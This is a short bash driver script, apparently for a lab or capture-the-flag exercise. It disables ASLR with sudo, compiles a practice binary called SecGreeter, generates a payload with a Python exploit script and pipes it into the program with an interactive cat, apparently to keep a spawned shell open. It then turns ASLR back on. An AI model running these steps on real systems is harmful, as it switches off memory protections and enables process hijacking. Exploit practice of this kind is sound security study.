#!/bin/bash

# Disable ASLR
echo "[*] Disabling ASLR..."
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Compile the binary
echo "[*] Compiling SecGreeter..."
make secure_greeter

# Generate the payload
echo "[*] Generating payload..."
python3 secGreeter_exploit.py

# Execute the exploit
echo "[*] Injecting payload..."
(cat secGreeter_payload; cat) | ./SecGreeter

# Re-enable ASLR
echo "[*] Re-enabling ASLR..."
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space